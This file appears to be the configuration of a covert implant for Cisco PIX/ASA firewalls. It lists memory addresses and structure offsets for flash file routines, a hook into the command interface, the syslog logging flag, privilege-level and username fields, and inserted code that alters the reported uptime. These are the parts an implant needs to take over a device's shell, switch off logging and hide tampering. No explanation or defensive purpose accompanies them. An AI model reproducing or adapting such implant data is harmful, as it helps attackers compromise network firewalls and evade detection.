; --- SECTION I ---
;
0x10070700            // pix version
0x540000              // address of implant configuration
FlashMkdirAddress   0x00455480      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x0075be8c   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x003bb7c0      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x0075be34      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x003bb650      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x00454fa8      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x0045448c      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004550e0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x00455204     // ifs_rename; move a file
FlashGetFileInfoAddress 0x004556b0  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x004569f4     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000018  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x00c71a98  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x00ecb208 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x00115c90      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x001489d8      // addr of the command interface start function -- telnet function
CommandListAddr     0x00d8af10      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00df5c38      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x00c7da40      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00f69d10      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x6c            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x70            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x78            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x00000938      // offset into the syslog structure where the logging level is stored
Open                0x00115d40      // open
CLIHookAddress       0x00148ea0      // Address of hook into the command interface
WatchDogTimeout     0x00000000      // Address where the thread timeout value is stored 
UpTimeCounter       0x00ea4eb0      // Address of the up time counter
Display_uptime_addr 0x001554b0      // Address of the function that display the uptime
Inserted_code_addr  0x001560ab      // Address of the our insterted function to add time to the uptime
AvailMemoryPtr      0x00ea5be8      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
